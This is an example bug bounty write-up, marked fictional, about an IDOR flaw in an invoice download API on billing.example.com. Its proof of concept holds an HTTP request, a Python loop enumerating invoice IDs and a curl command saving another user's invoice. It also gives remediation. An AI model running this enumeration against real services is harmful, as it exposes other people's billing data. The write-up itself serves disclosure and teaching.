---
title: "Example post: IDOR Exposes Other Users' Invoices on example.com"
date: 2026-10-14T10:00:00Z
description: "EXAMPLE write-up showing the layout — an IDOR on an invoice API on a fictional target."
summary: "EXAMPLE write-up showing the layout — an IDOR on an invoice API on a fictional target."
tags: ["IDOR", "Access Control"]
severity: ["Medium"]
program: "Example Program (fictional)"
bounty: "N/A — example only"
example: true
---

## Summary

The invoice download endpoint on `billing.example.com` accepted a sequential numeric `invoice_id` and did not check that the invoice belonged to the authenticated user.

## Impact

Any authenticated user could download any customer's invoices, leaking names, billing addresses and partial payment details.

## Steps to Reproduce

1. Log in as user A and download one of your invoices; note the `invoice_id`.
2. Log in as user B and replay the request with user A's `invoice_id`.
3. User A's invoice PDF is returned.

## Proof of Concept

```http
GET /api/invoices/100231/pdf HTTP/1.1
Host: billing.example.com
Authorization: Bearer <user-B-token>
```

Enumerating a small range to confirm (run only against your own test accounts):

```python
import requests

s = requests.Session()
s.headers["Authorization"] = "Bearer USER_B_TOKEN"

for inv in range(100230, 100235):
    r = s.get(f"https://billing.example.com/api/invoices/{inv}/pdf")
    print(inv, r.status_code, len(r.content))
```

```bash
curl -s -H "Authorization: Bearer $TOKEN_B" \
  https://billing.example.com/api/invoices/100231/pdf -o leaked.pdf
```

## Remediation

- Enforce object-level authorization: `invoice.owner_id == current_user.id`.
- Use non-guessable identifiers (UUIDs) as defense in depth — not as the fix.

## Timeline

| Date | Event |
|------|-------|
| 2026-02-01 | Reported (example) |
| 2026-02-03 | Triaged (example) |
| 2026-02-15 | Fixed (example) |

## Bounty

N/A — this is a fictional example post.
